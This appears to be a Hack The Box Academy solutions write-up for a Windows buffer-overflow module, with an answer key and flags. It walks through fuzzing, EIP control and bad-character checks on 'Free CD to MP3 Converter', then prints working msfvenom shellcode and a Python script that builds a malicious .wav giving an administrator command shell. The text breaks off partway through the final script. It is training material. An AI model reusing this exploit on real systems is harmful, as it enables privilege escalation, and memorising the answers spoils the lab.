

| Section                      | Question Number | Answer                           |
| ---------------------------- | --------------- | -------------------------------- |
| Debugging Windows Programs   | Question 1      | cdextract                        |
| Fuzzing Parameters           | Question 1      | 5000                             |
| Controlling EIP              | Question 1      | 915                              |
| Identifying Bad Characters   | Question 1      | 0                                |
| Finding a Return Instruction | Question 1      | 00457418                         |
| Jumping to Shellcode         | Question 1      | HTB{l0c4l\_0v3rfl0w\_m4573r}     |
| Remote Fuzzing               | Question 1      | 1500                             |
| Remote Exploitation          | Question 1      | HTB{r3m073\_buff3r\_0v3rfl0w3r}  |
| Skills Assessment            | Question 1      | HTB{r3m073\_3xpl0174710n\_n1nj4} |

## Acronyms Used in Writeups

| Acronym | Meaning |
| --- | --- |
| STMIP | Spawned Target Machine IP Address |
| STMPO | Spawned Target Machine Port |
| PMVPN | Personal Machine with a Connection to the Academy's VPN |
| PWNIP | Pwnbox IP Address (or PMVPN IP Address) |
| PWNPO | Pwnbox Port (or PMVPN Port) |

# Debugging Windows Programs

## Question 1

### "Try to RDP into the Windows VM using one of the methods mentioned above, and apply what you learned in this module. When you try to attach to 'Free CD to MP3 Converter', what is the name of its process?"

Students first need to RDP into the Windows spawned target machine using `xfreerdp` (or any other tool, such as `Remmina`) with the credentials `htb-student:Academy_student!`:

Code: shell

```shell
xfreerdp /v:STMIP /u:htb-student /p:Academy_student!
```

```
┌─[us-academy-1]─[10.10.14.27]─[htb-ac413848@pwnbox-base]─[~]
└──╼ [★]$ xfreerdp /v:10.129.43.22 /u:htb-student /p:Academy_student!

[12:19:05:274] [2266:2268] [INFO][com.freerdp.core] - freerdp_connect:freerdp_set_last_error_ex resetting error state
[12:19:05:275] [2266:2268] [INFO][com.freerdp.client.common.cmdline] - loading channelEx rdpdr
[12:19:05:275] [2266:2268] [INFO][com.freerdp.client.common.cmdline] - loading channelEx rdpsnd
[12:19:05:275] [2266:2268] [INFO][com.freerdp.client.common.cmdline] - loading channelEx cliprdr
[12:19:05:594] [2266:2268] [INFO][com.freerdp.primitives] - primitives autodetect, using optimized
<SNIP>
Do you trust the above certificate? (Y/T/N) Y
<SNIP>
```

![[HTB Solutions/Others/z. images/63c702107d8a1f472798c3b997843593_MD5.jpg]]

Students now need to debug the program `Free CD to MP3 Converter`, and they can either run it using `x32dbg` or run it separately and then attach its process through `x32dbg`. The latter method will be used. Students first need to run `Free CD to MP3 Converter` and then `x32dbg`, both of which reside on the Desktop directory:

![[HTB Solutions/Others/z. images/fffb3fc31600178b2ddac4cab748e34d_MD5.jpg]]

Afterward, students need to open the `x32dbg` window and click on "File > Attach":

![[HTB Solutions/Others/z. images/5921f046f14c4c16475215b1007aafd0_MD5.jpg]]

They will then see all processes, including their names; the name of the process belonging to `Free CD to MP3 Converter` is `cdextract`:

![[HTB Solutions/Others/z. images/96d4cd325ac04870956415e6db30bc16_MD5.jpg]]

Answer: `cdextract`

# Fuzzing Parameters

## Question 1

### "Try to fuzz the program with '.wav' files of increments of 1000 bytes '1000, 2000, 3000...', and find the smallest payload size that crashes the program and overwrites EIP with '41414141'."

Using the same RDP connection from question 1 of the section "Debugging Windows Programs", students need to generate a `.wav` file starting with 1000 A characters (thus, 1000 bytes), which can be done using Python:

Code: powershell

```powershell
python -c "print('A' * 1000, file=open('fuzz.wav', 'w'))"
```

![[HTB Solutions/Others/z. images/54ab7149642b0f429d84794af6f4eccf_MD5.jpg]]

Then, while being attached to `x32dbg`, students need to open `Free CD to MP3 Converter` and click on "Encode":

![[HTB Solutions/Others/z. images/d08b3aa59dc66229162e47a37784d9cb_MD5.jpg]]

Subsequently, students need to choose the name of the file that holds the A characters (in this case "fuzz.wav") and click "Open":

![[HTB Solutions/Others/z. images/de55ae4992c3bf3005ed85433353599e_MD5.jpg]]

Returning back to `x32dbg`, students will notice that there is an exception raised, however, it is not the `EXCEPTION_ACCESS_VIOLATION` exception, thus, students need to click on the "Run" button:

![[HTB Solutions/Others/z. images/b48e5573444fa472a0e1df5026ccc745_MD5.jpg]]

And the program will continue execution:

![[HTB Solutions/Others/z. images/1ad7680d6a0334cd9fe12cc529ceb720_MD5.jpg]]

1000 bytes did not crash the program and overwrite the `EIP` with the A characters. Thus, students here need to increment the number of A characters by another 1000 bytes and do the above steps until both conditions are met.

Eventually, `5000` bytes will crash the program and overwrite the `EIP` with A characters:

Code: powershell

```powershell
python -c "print('A' * 5000, file=open('fuzz5000.wav', 'w'))"
```

![[HTB Solutions/Others/z. images/f9252a5a1c0a55e759979e987c9b1b00_MD5.jpg]]

Answer: `5000`

# Controlling EIP

## Question 1

### "If you find the value 'B5eB' in EIP after sending your pattern, what would be the EIP offset?"

This question can be either solved with `msf-pattern_offset` or the `ERC` plugin.

With the former method, students first need to convert the string `B5eB` into hexadecimal, which can be done using Python 3:

Code: powershell

```powershell
python3 -c "import codecs;print(codecs.encode(b'B5eB', 'hex').decode())"
```

```
┌─[us-academy-1]─[10.10.14.27]─[htb-ac413848@pwnbox-base]─[~]
└──╼ [★]$ python3 -c "import codecs;print(codecs.encode(b'B5eB', 'hex').decode())"

42356542
```

Now, students can feed the value `42356542` into `msf-pattern_offset`:

Code: shell

```shell
msf-pattern_offset -q 42356542
```

```
┌─[us-academy-1]─[10.10.14.27]─[htb-ac413848@pwnbox-base]─[~]
└──╼ [★]$ msf-pattern_offset -q 42356542

[*] Exact match at offset 915
```

While with the latter method it is easier, given that no conversion is required:

Code: powershell

```powershell
ERC --pattern o B5eB
```

![[HTB Solutions/Others/z. images/99924f57c497786a2fad77baa53a3c56_MD5.jpg]]

Answer: `915`

# Identifying Bad Characters

## Question 1

### "Try to repeat what you learned in this section to identify all bad characters for our program. What is the total number of bad characters you identified? "Note: the result may differ from what was shown in this section""

Using the same RDP connection from question 1 of the section "Debugging Windows Programs", students first need to use `ERC` to generate `.bin` and `.wav` files that hold the list of all characters:

Code: powershell

```powershell
ERC --bytearray
```

![[HTB Solutions/Others/z. images/ca298ada207b5c79d1480067ded68a0e_MD5.jpg]]

Afterward, students now need to update their Python exploit script by generating a `.wav` file with the characters string generated by `ERC`. Students need to write a new function named "badChars", and use the characters under "C#" in the file "ByteArray\_1.txt" as a list of bytes in the variable "allChars". Then, write to a file named "chars.wav" the same payload from the function "eipControl", however with the addition of appending the "allChars" variable to it:

Code: python

```python
def badChars():
    allChars = bytes([0x00, 0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 0x07,
                      0x08, 0x09, 0x0A, 0x0B, 0x0C, 0x0D, 0x0E, 0x0F,
                      0x10, 0x11, 0x12, 0x13, 0x14, 0x15, 0x16, 0x17,
                      					   <SNIP>
                      0xE8, 0xE9, 0xEA, 0xEB, 0xEC, 0xED, 0xEE, 0xEF,
                      0xF0, 0xF1, 0xF2, 0xF3, 0xF4, 0xF5, 0xF6, 0xF7,
                      0xF8, 0xF9, 0xFA, 0xFB, 0xFC, 0xFD, 0xFE, 0xFF
                    ])
    offset = 4112
    buffer = b"A" * offset
    EIP = b"B" * 4
    payload = buffer + EIP + allChars
    with open("chars.wav", "wb") as file:
        file.write(payload)
badChars()
```

![[HTB Solutions/Others/z. images/bfa72e974044c90a2284cc4396c9de86_MD5.jpg]]

With the Python script ready, students need to run it to generate the "chars.wav" file in the Desktop directory:

![[HTB Solutions/Others/z. images/682c953a526a1ca4a68e7a6a95bbeddd_MD5.jpg]]

Then, while attached to `x32dbg`, students need to load the "chars.wav" file into `Free CD to MP3 Converter`:

![[HTB Solutions/Others/z. images/35d8dfd23d14a3005ffd664df926e1fc_MD5.jpg]]

Afterward, students need to compare the input in memory to all characters using `ERC`. Students first need to copy the address of `ESP`, which is `0014F974`:

![[HTB Solutions/Others/z. images/b58ce2002eac85d33bc7d920212eb6e4_MD5.jpg]]

Students will then use the `--compare` option of `ERC` on the `ESP` address and the location of the `.bin` file that contains all characters generated earlier:

Code: powershell

```powershell
ERC --compare 0014F974 C:\Users\htb-student\Desktop\ByteArray_1.bin
```

After executing this command, students need to go to the "Log" tab, and notice that both memory regions are identical:

![[HTB Solutions/Others/z. images/3e5ad31342c2f9f10d5219bb4c1d9478_MD5.jpg]]

Thus, the number of bad characters is `0`.

Answer: `0`

# Finding a Return Instruction

## Question 1

### "Try to search the 'cdextract.exe' binary for the 'PUSH ESP; RET' instruction as pattern '54C3'. What is the address of the first result you get?"

Using the same RDP connection from question 1 of the section "Debugging Windows Programs", students first need to open the "Symbols" tab and double-click on the `cdextract` executable:

![[HTB Solutions/Others/z. images/44793e584ce44df263380d9f809856b6_MD5.jpg]]

Then, since `PUSH ESP; RET` are two assembly instructions, students need find their equivalent machine code using either `msf-nasm_shell` or [Online x86 / x64 Assembler and Disassembler](https://defuse.ca/online-x86-assembler.htm). With the former:

Code: shell

```shell
msf-nasm_shell
PUSH ESP
RET
```

```
┌─[us-academy-1]─[10.10.14.27]─[htb-ac413848@pwnbox-base]─[~]
└──╼ [★]$ msf-nasm_shell

nasm > PUSH ESP
00000000  54                push esp
nasm > RET
00000000  C3                ret
```

With the latter:

![[HTB Solutions/Others/z. images/79641a39a29b23077df1e342a9e4e4fc_MD5.jpg]]

Thus `PUSH ESP; RET` is `54C3`. Armed with the machine code, students need to click `Ctrl + b` inside of `x32dbg` within `cdextract`, and supply `54C3` as the hex value to be searched for:

![[HTB Solutions/Others/z. images/5764d027f35c2437d3e364f13d113796_MD5.jpg]]

The first entry holds the answer `00457418`:

![[HTB Solutions/Others/z. images/2d5ff2dafe5d6d7191c3d87d1ef15d3a_MD5.jpg]]

Students can copy the address by right-clicking on it then clicking on `Copy` -> `Address`:

![[HTB Solutions/Others/z. images/7cbfdf94dabce42054b30bcf601c1281_MD5.jpg]]

Answer: `00457418`

# Jumping to Shellcode

## Question 1

### "In the 'Documents' folder you will find a shortcut that runs the 'Free CD to MP3' program as admin. Try to use the exploit on it to get a command prompt as the admin user, and read the flag in the admin's Desktop."

Students first need to create the shellcode that will open up the Windows `CMD` using `msfvenom` with the `-p` and `-f` options and the `CMD` variable:

Code: shell

```shell
msfvenom -p 'windows/exec' CMD='cmd.exe' -f 'python'
```

```
┌─[us-academy-1]─[10.10.14.215]─[htb-ac413848@pwnbox-base]─[~]
└──╼ [★]$ msfvenom -p 'windows/exec' CMD='cmd.exe' -f 'python'

[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder specified, outputting raw payload
Payload size: 192 bytes
Final size of python file: 944 bytes
buf =  b""
buf += b"\xfc\xe8\x82\x00\x00\x00\x60\x89\xe5\x31\xc0\x64\x8b"
buf += b"\x50\x30\x8b\x52\x0c\x8b\x52\x14\x8b\x72\x28\x0f\xb7"
buf += b"\x4a\x26\x31\xff\xac\x3c\x61\x7c\x02\x2c\x20\xc1\xcf"
buf += b"\x0d\x01\xc7\xe2\xf2\x52\x57\x8b\x52\x10\x8b\x4a\x3c"
buf += b"\x8b\x4c\x11\x78\xe3\x48\x01\xd1\x51\x8b\x59\x20\x01"
buf += b"\xd3\x8b\x49\x18\xe3\x3a\x49\x8b\x34\x8b\x01\xd6\x31"
buf += b"\xff\xac\xc1\xcf\x0d\x01\xc7\x38\xe0\x75\xf6\x03\x7d"
buf += b"\xf8\x3b\x7d\x24\x75\xe4\x58\x8b\x58\x24\x01\xd3\x66"
buf += b"\x8b\x0c\x4b\x8b\x58\x1c\x01\xd3\x8b\x04\x8b\x01\xd0"
buf += b"\x89\x44\x24\x24\x5b\x5b\x61\x59\x5a\x51\xff\xe0\x5f"
buf += b"\x5f\x5a\x8b\x12\xeb\x8d\x5d\x6a\x01\x8d\x85\xb2\x00"
buf += b"\x00\x00\x50\x68\x31\x8b\x6f\x87\xff\xd5\xbb\xf0\xb5"
buf += b"\xa2\x56\x68\xa6\x95\xbd\x9d\xff\xd5\x3c\x06\x7c\x0a"
buf += b"\x80\xfb\xe0\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x53"
buf += b"\xff\xd5\x63\x6d\x64\x2e\x65\x78\x65\x00"
```

Once the shellcode has been generated, students now need to update their Python script by adding a new function "exploit()":

Code: python

```python
from struct import pack
def exploit():
    buf =  b""
    buf += b"\xfc\xe8\x82\x00\x00\x00\x60\x89\xe5\x31\xc0\x64\x8b"
    buf += b"\x50\x30\x8b\x52\x0c\x8b\x52\x14\x8b\x72\x28\x0f\xb7"
    buf += b"\x4a\x26\x31\xff\xac\x3c\x61\x7c\x02\x2c\x20\xc1\xcf"
    buf += b"\x0d\x01\xc7\xe2\xf2\x52\x57\x8b\x52\x10\x8b\x4a\x3c"
    buf += b"\x8b\x4c\x11\x78\xe3\x48\x01\xd1\x51\x8b\x59\x20\x01"
    buf += b"\xd3\x8b\x49\x18\xe3\x3a\x49\x8b\x34\x8b\x01\xd6\x31"
    buf += b"\xff\xac\xc1\xcf\x0d\x01\xc7\x38\xe0\x75\xf6\x03\x7d"
    buf += b"\xf8\x3b\x7d\x24\x75\xe4\x58\x8b\x58\x24\x01\xd3\x66"
    buf += b"\x8b\x0c\x4b\x8b\x58\x1c\x01\xd3\x8b\x04\x8b\x01\xd0"
    buf += b"\x89\x44\x24\x24\x5b\x5b\x61\x59\x5a\x51\xff\xe0\x5f"
    buf += b"\x5f\x5a\x8b\x12\xeb\x8d\x5d\x6a\x01\x8d\x85\xb2\x00"
    buf += b"\x00\x00\x50\x68\x31\x8b\x6f\x87\xff\xd5\xbb\xf0\xb5"
    buf += b"\xa2\x56\x68\xa6\x95\xbd\x9d\xff\xd5\x3c\x06\x7c\x0a"
    buf += b"\x80\xfb\xe0\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x53"
    buf += b"\xff\xd5\x63\x6d\x64\x2e\x65\x78\x65\x00"

    offset = 4112
    buffer = b"A" * offset
    EIP = pack('<L', 0x00457418)
    NOP = b"\x90" * 32
    payload = buffer + EIP + NOP + buf

    with open('exploit.wav', 'wb') as file:
        file.write(payload)

exploit()
```

All of the components of the script are similar to the ones before, except for the addition/modification of:

Code: python

```python
from struct import pack
EIP = pack('<L', 0x00457418)
NOP = b"\x90" * 32
payload = buffer + EIP + NOP + buf
```

The first line imports the `pack` function from the `struct` library, while the second line specifies the return address (converted from hex to a `Little Endian` memory address) that will execute the shellcode (i.e., contained in the "buf" variable) which will be written on the stack. The address chosen is the one found in Question 1 of the section "Finding a Return Instruction". The variable "NOP" holds the number of `NOP` instructions added before the shellcode, and at last, the variable "payload" appends all of the variables together to formulate the complete exploit payload written to the "exploit.wav" file.

Using the same RDP connection from question 1 of the section "Debugging Windows Programs", and after running the Python script, students will have the "exploit.wav" file on the Desktop directory:

![[HTB Solutions/Others/z. images/96995cd77d6c8474ba39127775e94269_MD5.jpg]]

Afterward, students need to open the Documents directory and find the shortcut to the program `Free CD to MP3 Converter` which runs as Administrator:

![[HTB Solutions/Others/z. images/161874bf7066151cfe0063218a75d72a_MD5.jpg]]

After executing it, students need to click on "Encode" inside of the program and navigate to their "htb-student" directory found under Users and choose the "exploit.wav" file in Desktop:

![[HTB Solutions/Others/z. images/e927c560dc1c7eaa6f569906e2ec7dbe_MD5.jpg]]

![[HTB Solutions/Others/z. images/3095a1f2031492b3bd84291193bd0299_MD5.jpg]]

Once "exploit.wav" is opened, students will receive a `CMD` shell run as Administrator. Thus, they now need to navigate to the Desktop directory of the Administrator user and print the flag contents (or use the `type` command directly by specifying its absolute path):

Code: powershell

```powershell
cd C:\Users\Administrator\Desktop
type flag.txt
```

```
C:\Users\htb-student\Desktop>cd C:\Users\Administrator\Desktop

C:\Users\Administrator\Desktop>type flag.txt

HTB{l0c4l_0v3rfl0w_m4573r}
```

![[HTB Solutions/Others/z. images/64c72c2794c6054deff929bdd6870c14_MD5.jpg]]

Answer: `HTB{l0c4l_0v3rfl0w_m4573r}`

At last, the final and complete "BOExploit.py" script is:

Code: python

```python
def eipOffset():
    payload = bytes("Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac"
                    "9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8"
                    "Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7A"
                    "i8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al"
                    "7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6"
                    "Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5A"
                    "r6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au"
                    "5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4"
                    "Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3B"
                    "a4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd"
                    "3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2"
                    "Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2Bh3Bh4Bh5Bh6Bh7Bh8Bh9Bi0Bi1Bi2Bi3Bi4Bi5Bi6Bi7Bi8Bi9Bj0Bj1B"
                    "j2Bj3Bj4Bj5Bj6Bj7Bj8Bj9Bk0Bk1Bk2Bk3Bk4Bk5Bk6Bk7Bk8Bk9Bl0Bl1Bl2Bl3Bl4Bl5Bl6Bl7Bl8Bl9Bm0Bm"
                    "1Bm2Bm3Bm4Bm5Bm6Bm7Bm8Bm9Bn0Bn1Bn2Bn3Bn4Bn5Bn6Bn7Bn8Bn9Bo0Bo1Bo2Bo3Bo4Bo5Bo6Bo7Bo8Bo9Bp0"
                    "Bp1Bp2Bp3Bp4Bp5Bp6Bp7Bp8Bp9Bq0Bq1Bq2Bq3Bq4Bq5Bq6Bq7Bq8Bq9Br0Br1Br2Br3Br4Br5Br6Br7Br8Br9B"
                    "s0Bs1Bs2Bs3Bs4Bs5Bs6Bs7Bs8Bs9Bt0Bt1Bt2Bt3Bt4Bt5Bt6Bt7Bt8Bt9Bu0Bu1Bu2Bu3Bu4Bu5Bu6Bu7Bu8Bu"
                    "9Bv0Bv1Bv2Bv3Bv4Bv5Bv6Bv7Bv8Bv9Bw0Bw1Bw2Bw3Bw4Bw5Bw6Bw7Bw8Bw9Bx0Bx1Bx2Bx3Bx4Bx5Bx6Bx7Bx8"
                    "Bx9By0By1By2By3By4By5By6By7By8By9Bz0Bz1Bz2Bz3Bz4Bz5Bz6Bz7Bz8Bz9Ca0Ca1Ca2Ca3Ca4Ca5Ca6Ca7C"
                    "a8Ca9Cb0Cb1Cb2Cb3Cb4Cb5Cb6Cb7Cb8Cb9Cc0Cc1Cc2Cc3Cc4Cc5Cc6Cc7Cc8Cc9Cd0Cd1Cd2Cd3Cd4Cd5Cd6Cd"
                    "7Cd8Cd9Ce0Ce1Ce2Ce3Ce4Ce5Ce6Ce7Ce8Ce9Cf0Cf1Cf2Cf3Cf4Cf5Cf6Cf7Cf8Cf9Cg0Cg1Cg2Cg3Cg4Cg5Cg6"
                    "Cg7Cg8Cg9Ch0Ch1Ch2Ch3Ch4Ch5Ch6Ch7Ch8Ch9Ci0Ci1Ci2Ci3Ci4Ci5Ci6Ci7Ci8Ci9Cj0Cj1Cj2Cj3Cj4Cj5C"
                    "j6Cj7Cj8Cj9Ck0Ck1Ck2Ck3Ck4Ck5Ck6Ck7Ck8Ck9Cl0Cl1Cl2Cl3Cl4Cl5Cl6Cl7Cl8Cl9Cm0Cm1Cm2Cm3Cm4Cm"
                    "5Cm6Cm7Cm8Cm9Cn0Cn1Cn2Cn3Cn4Cn5Cn6Cn7Cn8Cn9Co0Co1Co2Co3Co4Co5Co6Co7Co8Co9Cp0Cp1Cp2Cp3Cp4"
                    "Cp5Cp6Cp7Cp8Cp9Cq0Cq1Cq2Cq3Cq4Cq5Cq6Cq7Cq8Cq9Cr0Cr1Cr2Cr3Cr4Cr5Cr6Cr7Cr8Cr9Cs0Cs1Cs2Cs3C"
                    "s4Cs5Cs6Cs7Cs8Cs9Ct0Ct1Ct2Ct3Ct4Ct5Ct6Ct7Ct8Ct9Cu0Cu1Cu2Cu3Cu4Cu5Cu6Cu7Cu8Cu9Cv0Cv1Cv2Cv"
                    "3Cv4Cv5Cv6Cv7Cv8Cv9Cw0Cw1Cw2Cw3Cw4Cw5Cw6Cw7Cw8Cw9Cx0Cx1Cx2Cx3Cx4Cx5Cx6Cx7Cx8Cx9Cy0Cy1Cy2"
                    "Cy3Cy4Cy5Cy6Cy7Cy8Cy9Cz0Cz1Cz2Cz3Cz4Cz5Cz6Cz7Cz8Cz9Da0Da1Da2Da3Da4Da5Da6Da7Da8Da9Db0Db1D"
                    "b2Db3Db4Db5Db6Db7Db8Db9Dc0Dc1Dc2Dc3Dc4Dc5Dc6Dc7Dc8Dc9Dd0Dd1Dd2Dd3Dd4Dd5Dd6Dd7Dd8Dd9De0De"
                    "1De2De3De4De5De6De7De8De9Df0Df1Df2Df3Df4Df5Df6Df7Df8Df9Dg0Dg1Dg2Dg3Dg4Dg5Dg6Dg7Dg8Dg9Dh0"
                    "Dh1Dh2Dh3Dh4Dh5Dh6Dh7Dh8Dh9Di0Di1Di2Di3Di4Di5Di6Di7Di8Di9Dj0Dj1Dj2Dj3Dj4Dj5Dj6Dj7Dj8Dj9D"
                    "k0Dk1Dk2Dk3Dk4Dk5Dk6Dk7Dk8Dk9Dl0Dl1Dl2Dl3Dl4Dl5Dl6Dl7Dl8Dl9Dm0Dm1Dm2Dm3Dm4Dm5Dm6Dm7Dm8Dm"
                    "9Dn0Dn1Dn2Dn3Dn4Dn5Dn6Dn7Dn8Dn9Do0Do1Do2Do3Do4Do5Do6Do7Do8Do9Dp0Dp1Dp2Dp3Dp4Dp5Dp6Dp7Dp8"
                    "Dp9Dq0Dq1Dq2Dq3Dq4Dq5Dq6Dq7Dq8Dq9Dr0Dr1Dr2Dr3Dr4Dr5Dr6Dr7Dr8Dr9Ds0Ds1Ds2Ds3Ds4Ds5Ds6Ds7D"
                    "s8Ds9Dt0Dt1Dt2Dt3Dt4Dt5Dt6Dt7Dt8Dt9Du0Du1Du2Du3Du4Du5Du6Du7Du8Du9Dv0Dv1Dv2Dv3Dv4Dv5Dv6Dv"
                    "7Dv8Dv9Dw0Dw1Dw2Dw3Dw4Dw5Dw6Dw7Dw8Dw9Dx0Dx1Dx2Dx3Dx4Dx5Dx6Dx7Dx8Dx9Dy0Dy1Dy2Dy3Dy4Dy5Dy6"
                    "Dy7Dy8Dy9Dz0Dz1Dz2Dz3Dz4Dz5Dz6Dz7Dz8Dz9Ea0Ea1Ea2Ea3Ea4Ea5Ea6Ea7Ea8Ea9Eb0Eb1Eb2Eb3Eb4Eb5E"
                    "b6Eb7Eb8Eb9Ec0Ec1Ec2Ec3Ec4Ec5Ec6Ec7Ec8Ec9Ed0Ed1Ed2Ed3Ed4Ed5Ed6Ed7Ed8Ed9Ee0Ee1Ee2Ee3Ee4Ee"
                    "5Ee6Ee7Ee8Ee9Ef0Ef1Ef2Ef3Ef4Ef5Ef6Ef7Ef8Ef9Eg0Eg1Eg2Eg3Eg4Eg5Eg6Eg7Eg8Eg9Eh0Eh1Eh2Eh3Eh4"
                    "Eh5Eh6Eh7Eh8Eh9Ei0Ei1Ei2Ei3Ei4Ei5Ei6Ei7Ei8Ei9Ej0Ej1Ej2Ej3Ej4Ej5Ej6Ej7Ej8Ej9Ek0Ek1Ek2Ek3E"
                    "k4Ek5Ek6Ek7Ek8Ek9El0El1El2El3El4El5El6El7El8El9Em0Em1Em2Em3Em4Em5Em6Em7Em8Em9En0En1En2En"
                    "3En4En5En6En7En8En9Eo0Eo1Eo2Eo3Eo4Eo5Eo6Eo7Eo8Eo9Ep0Ep1Ep2Ep3Ep4Ep5Ep6Ep7Ep8Ep9Eq0Eq1Eq2"
                    "Eq3Eq4Eq5Eq6Eq7Eq8Eq9Er0Er1Er2Er3Er4Er5Er6Er7Er8Er9Es0Es1Es2Es3Es4Es5Es6Es7Es8Es9Et0Et1E"
                    "t2Et3Et4Et5Et6Et7Et8Et9Eu0Eu1Eu2Eu3Eu4Eu5Eu6Eu7Eu8Eu9Ev0Ev1Ev2Ev3Ev4Ev5Ev6Ev7Ev8Ev9Ew0Ew"
                    "1Ew2Ew3Ew4Ew5Ew6Ew7Ew8Ew9Ex0Ex1Ex2Ex3Ex4Ex5Ex6Ex7Ex8Ex9Ey0Ey1Ey2Ey3Ey4Ey5Ey6Ey7Ey8Ey9Ez0"
                    "Ez1Ez2Ez3Ez4Ez5Ez6Ez7Ez8Ez9Fa0Fa1Fa2Fa3Fa4Fa5Fa6Fa7Fa8Fa9Fb0Fb1Fb2Fb3Fb4Fb5Fb6Fb7Fb8Fb9F"
                    "c0Fc1Fc2Fc3Fc4Fc5Fc6Fc7Fc8Fc9Fd0Fd1Fd2Fd3Fd4Fd5Fd6Fd7Fd8Fd9Fe0Fe1Fe2Fe3Fe4Fe5Fe6Fe7Fe8Fe"
                    "9Ff0Ff1Ff2Ff3Ff4Ff5Ff6Ff7Ff8Ff9Fg0Fg1Fg2Fg3Fg4Fg5Fg6Fg7Fg8Fg9Fh0Fh1Fh2Fh3Fh4Fh5Fh6Fh7Fh8"
                    "Fh9Fi0Fi1Fi2Fi3Fi4Fi5Fi6Fi7Fi8Fi9Fj0Fj1Fj2Fj3Fj4Fj5Fj6Fj7Fj8Fj9Fk0Fk1Fk2Fk3Fk4Fk5Fk6Fk7F"
                    "k8Fk9Fl0Fl1Fl2Fl3Fl4Fl5Fl6Fl7Fl8Fl9Fm0Fm1Fm2Fm3Fm4Fm5Fm6Fm7Fm8Fm9Fn0Fn1Fn2Fn3Fn4Fn5Fn6Fn"
                    "7Fn8Fn9Fo0Fo1Fo2Fo3Fo4Fo5Fo6Fo7Fo8Fo9Fp0Fp1Fp2Fp3Fp4Fp5Fp6Fp7Fp8Fp9Fq0Fq1Fq2Fq3Fq4Fq5Fq6"
                    "Fq7Fq8Fq9Fr0Fr1Fr2Fr3Fr4Fr5Fr6Fr7Fr8Fr9Fs0Fs1Fs2Fs3Fs4Fs5Fs6Fs7Fs8Fs9Ft0Ft1Ft2Ft3Ft4Ft5F"
                    "t6Ft7Ft8Ft9Fu0Fu1Fu2Fu3Fu4Fu5Fu6Fu7Fu8Fu9Fv0Fv1Fv2Fv3Fv4Fv5Fv6Fv7Fv8Fv9Fw0Fw1Fw2Fw3Fw4Fw"
                    "5Fw6Fw7Fw8Fw9Fx0Fx1Fx2Fx3Fx4Fx5Fx6Fx7Fx8Fx9Fy0Fy1Fy2Fy3Fy4Fy5Fy6Fy7Fy8Fy9Fz0Fz1Fz2Fz3Fz4"
                    "Fz5Fz6Fz7Fz8Fz9Ga0Ga1Ga2Ga3Ga4Ga5Ga6Ga7Ga8Ga9Gb0Gb1Gb2Gb3Gb4Gb5Gb6Gb7Gb8Gb9Gc0Gc1Gc2Gc3G"
                    "c4Gc5Gc6Gc7Gc8Gc9Gd0Gd1Gd2Gd3Gd4Gd5Gd6Gd7Gd8Gd9Ge0Ge1Ge2Ge3Ge4Ge5Ge6Ge7Ge8Ge9Gf0Gf1Gf2Gf"
                    "3Gf4Gf5Gf6Gf7Gf8Gf9Gg0Gg1Gg2Gg3Gg4Gg5Gg6Gg7Gg8Gg9Gh0Gh1Gh2Gh3Gh4Gh5Gh6Gh7Gh8Gh9Gi0Gi1Gi2"
                    "Gi3Gi4Gi5Gi6Gi7Gi8Gi9Gj0Gj1Gj2Gj3Gj4Gj5Gj6Gj7Gj8Gj9Gk0Gk1Gk2Gk3Gk4Gk5Gk", "utf-8")
    with open("pattern.wav", "wb") as file:
        file.write(payload)

def eipControl():
    offset = 4112
    buffer = b"A" * offset
    EIP = b"B" * 4
    payload = buffer + EIP
    with open("control.wav", "wb") as file:
        file.write(payload)

def badChars():
    allChars = bytes([0x00, 0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 0x07,
                      0x08, 0x09, 0x0A, 0x0B, 0x0C, 0x0D, 0x0E, 0x0F,
                      0x10, 0x11, 0x12, 0x13, 0x14, 0x15, 0x16, 0x17,
                      0x18, 0x19, 0x1A, 0x1B, 0x1C, 0x1D, 0x1E, 0x1F,
                      0x20, 0x21, 0x22, 0x23, 0x24, 0x25, 0x26, 0x27,
                      0x28, 0x29, 0x2A, 0x2B, 0x2C, 0x2D, 0x2E, 0x2F,
